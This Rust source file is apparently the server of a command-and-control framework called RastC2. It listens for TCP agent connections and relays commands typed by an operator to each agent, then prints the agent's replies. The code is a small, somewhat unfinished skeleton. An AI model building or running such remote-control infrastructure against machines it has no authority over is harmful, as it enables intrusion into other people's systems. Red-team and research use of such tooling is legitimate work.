use std::sync::Arc;

use anyhow::Result;
use capnp_futures::serialize::AsOutputSegments;
use rast::{
    messages::c2_agent::c2_agent::{create_message, get_message},
    protocols::{tcp::TcpFactory, *},
    settings::Settings,
};

pub struct RastC2 {
    settings: Settings,
    servers: Vec<Arc<dyn ProtoServer>>,
    connections: Vec<Arc<dyn ProtoConnection>>,
}

impl RastC2 {
    pub fn with_settings(settings: Settings) -> Self {
        RastC2 {
            settings,
            servers: vec![],
            connections: vec![],
        }
    }

    pub async fn setup(&mut self) -> Result<()> {
        if let Some(conf) = &self.settings.server.tcp {
            let server = TcpFactory::new_server(conf).await?;
            self.servers.push(server);
        }
        Ok(())
    }

    pub async fn start(&self) -> Result<()> {
        loop {
            for server in &self.servers {
                if let Ok(conn) = server.get_conn().await {
                    tokio::spawn(RastC2::handle_client(conn));
                }
            }
        }
    }

    async fn handle_client(mut conn: Arc<ProtoConnectionType>) -> Result<()> {
        // let msg_r = conn.recv().await?;
        // println!("Message received: {}", msg_r);

        let stdin = std::io::stdin();
        loop {
            let mut cmd = String::new();
            if let Ok(n) = stdin.read_line(&mut cmd) {
                if n > 0 {
                    let msg = create_message(&cmd);
                    Arc::get_mut(&mut conn).unwrap().send(msg).await?;
                    let msg_r = Arc::get_mut(&mut conn).unwrap().recv().await?;
                    let msg_r = get_message(msg_r)?;
                    let msg_r = msg_r.trim_end_matches('\0');
                    println!("{}", msg_r);
                }
            };
        }

        // Ok(())
    }
}
